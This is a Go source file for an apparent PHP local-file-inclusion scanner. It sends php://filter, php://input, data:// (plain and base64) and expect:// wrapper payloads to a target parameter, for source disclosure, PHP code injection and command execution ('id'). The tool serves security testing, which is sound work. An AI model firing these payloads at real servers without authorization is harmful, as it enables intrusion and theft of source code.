package bypass

import (
	"encoding/base64"
	"strings"
)

// WrapperType represents PHP wrapper types
type WrapperType string

const (
	PHPFilter WrapperType = "php://filter"
	PHPInput  WrapperType = "php://input"
	Data      WrapperType = "data://"
	Expect    WrapperType = "expect://"
	Zip       WrapperType = "zip://"
	Phar      WrapperType = "phar://"
)

// WrapperTest represents a wrapper test case
type WrapperTest struct {
	Name      string
	Wrapper   string
	Payload   string
	CheckFunc func(string, string) bool
}

// WrapperResult represents the result of a wrapper test
type WrapperResult struct {
	Name    string
	Payload string
	Success bool
	Output  string
}

// DefaultWrapperTests returns the default wrapper tests
func DefaultWrapperTests() []WrapperTest {
	return []WrapperTest{
		{
			Name:    "php_filter_base64",
			Wrapper: "php://filter/convert.base64-encode/resource=",
			Payload: "index.php",
			CheckFunc: func(respBody, wrapper string) bool {
				// Check if response contains valid base64
				parts := strings.Split(respBody, "php://filter/convert.base64-encode/resource=")
				if len(parts) > 1 {
					encoded := strings.TrimSpace(parts[1])
					if _, err := base64.StdEncoding.DecodeString(encoded); err == nil {
						return true
					}
				}
				// Also check if there's base64 content in the response
				lines := strings.Split(respBody, "\n")
				for _, line := range lines {
					trimmed := strings.TrimSpace(line)
					if _, err := base64.StdEncoding.DecodeString(trimmed); err == nil && len(trimmed) > 10 {
						return true
					}
				}
				return false
			},
		},
		{
			Name:    "php_filter_read",
			Wrapper: "php://filter/read=convert.base64-encode/resource=",
			Payload: "index.php",
			CheckFunc: func(respBody, wrapper string) bool {
				// Similar to base64 check
				lines := strings.Split(respBody, "\n")
				for _, line := range lines {
					trimmed := strings.TrimSpace(line)
					if _, err := base64.StdEncoding.DecodeString(trimmed); err == nil && len(trimmed) > 10 {
						return true
					}
				}
				return false
			},
		},
		{
			Name:    "php_input",
			Wrapper: "php://input",
			Payload: "<?php echo 'LFI_TEST_SUCCESS'; ?>",
			CheckFunc: func(respBody, wrapper string) bool {
				return strings.Contains(respBody, "LFI_TEST_SUCCESS")
			},
		},
		{
			Name:    "data_text",
			Wrapper: "data://text/plain,",
			Payload: "<?php echo 'LFI_TEST_SUCCESS'; ?>",
			CheckFunc: func(respBody, wrapper string) bool {
				return strings.Contains(respBody, "LFI_TEST_SUCCESS")
			},
		},
		{
			Name:    "data_base64",
			Wrapper: "data://text/plain;base64,",
			Payload: "PD9waHAgZWNobyAnTEZJX1RFU1RfU1VDQ0VTUzsnID8+", // <?php echo 'LFI_TEST_SUCCESS' ?>
			CheckFunc: func(respBody, wrapper string) bool {
				return strings.Contains(respBody, "LFI_TEST_SUCCESS")
			},
		},
		{
			Name:    "expect_id",
			Wrapper: "expect://",
			Payload: "id",
			CheckFunc: func(respBody, wrapper string) bool {
				return strings.Contains(respBody, "uid=") ||
					strings.Contains(respBody, "root") ||
					strings.Contains(respBody, "gid=")
			},
		},
		{
			Name:    "phar_read",
			Wrapper: "phar://",
			Payload: "test.phar",
			CheckFunc: func(respBody, wrapper string) bool {
				// Generic check - may need adjustment
				return strings.Contains(respBody, "phar") ||
					strings.Contains(respBody, "LFI")
			},
		},
	}
}

// WrapperDetector detects PHP wrapper vulnerabilities
type WrapperDetector struct {
	httpClient HTTPClientInterface
	tests      []WrapperTest
}

// HTTPClientInterface defines the HTTP client interface
type HTTPClientInterface interface {
	PostData(targetURL, data string) (string, error)
	Get(url string) (string, error)
}

// NewWrapperDetector creates a new wrapper detector
func NewWrapperDetector(client HTTPClientInterface) *WrapperDetector {
	return &WrapperDetector{
		httpClient: client,
		tests:      DefaultWrapperTests(),
	}
}

// TestAll tests all wrappers
func (wd *WrapperDetector) TestAll(targetURL, param string) []WrapperResult {
	results := make([]WrapperResult, 0)

	for _, test := range wd.tests {
		fullPayload := test.Wrapper + test.Payload

		// Try with GET parameter
		testURL := targetURL + "?" + param + "=" + fullPayload
		respBody, err := wd.httpClient.Get(testURL)

		if err == nil && test.CheckFunc(respBody, test.Wrapper) {
			results = append(results, WrapperResult{
				Name:    test.Name,
				Payload: fullPayload,
				Success: true,
				Output:  respBody,
			})
		}

		// Try with POST data if applicable
		if test.Wrapper == "php://input" || test.Wrapper == "data://text/plain," {
			postData := param + "=" + fullPayload
			respBody, err := wd.httpClient.PostData(targetURL, postData)
			if err == nil && test.CheckFunc(respBody, test.Wrapper) {
				results = append(results, WrapperResult{
					Name:    test.Name + "_POST",
					Payload: fullPayload,
					Success: true,
					Output:  respBody,
				})
			}
		}
	}

	return results
}

// GetAvailableWrappers returns all available wrapper types
func (wd *WrapperDetector) GetAvailableWrappers() []string {
	wrappers := make([]string, 0)
	for _, test := range wd.tests {
		wrappers = append(wrappers, test.Name)
	}
	return wrappers
}
